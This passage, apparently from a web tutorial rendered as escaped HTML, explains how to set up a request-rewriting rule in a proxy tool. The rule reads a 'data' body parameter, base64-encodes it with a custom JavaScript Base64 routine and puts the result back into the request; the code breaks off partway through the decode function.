&lt;li&gt;Fetch payload from the &lt;code&gt;data&lt;/code&gt; parameter in our request body and store it in a variable named &lt;code&gt;payload_plain_text&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Use the JavaScript engine to base64 encode our &lt;code&gt;payload_plain_text&lt;/code&gt; data and store that as a new variable named &lt;code&gt;payload_base64&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Replace the &lt;code&gt;data&lt;/code&gt; request body parameter with the payload stored in the &lt;code&gt;payload_base64&lt;/code&gt; variable&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Whens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Match Type&lt;/th&gt;
&lt;th&gt;Match Text&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Response&lt;/td&gt;
&lt;td&gt;Matching Text&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;data&lt;/td&gt;
&lt;td&gt;Regexp&lt;/td&gt;
&lt;td&gt;.+&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Request Direction&lt;/th&gt;
&lt;th&gt;Thens&lt;/th&gt;
&lt;th&gt;Source Message Value&lt;/th&gt;
&lt;th&gt;Source Value Type&lt;/th&gt;
&lt;th&gt;Source Value Path&lt;/th&gt;
&lt;th&gt;Destination Variable Source&lt;/th&gt;
&lt;th&gt;Destination Variable Name&lt;/th&gt;
&lt;th&gt;Destination Value Type&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;N/A&lt;/td&gt;
&lt;td&gt;Set Variable&lt;/td&gt;
&lt;td&gt;Request Body&lt;/td&gt;
&lt;td&gt;Params&lt;/td&gt;
&lt;td&gt;data&lt;/td&gt;
&lt;td&gt;Global&lt;/td&gt;
&lt;td&gt;payload_plain_text&lt;/td&gt;
&lt;td&gt;Text&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Next we will add run a custom JavaScript that fetches the &lt;code&gt;payload_plain_text&lt;/code&gt;, base64
encodes it and saves it to &lt;code&gt;payload_base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Run Script:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Base64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// private property
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// public method for encoding
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;encode&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Base64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_utf8_encode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charCodeAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (isNaN(&lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (isNaN(&lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt;)) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;enc1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    },
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// public method for decoding
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;decode&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enc1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;/[^A-Za-z0-9\+\/\=]/g&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;_keyStr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;indexOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;input&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;charAt&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;enc1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#a6e22e&#34;&gt;enc2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;chr3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chr1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;enc3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chr2&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;enc4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) {
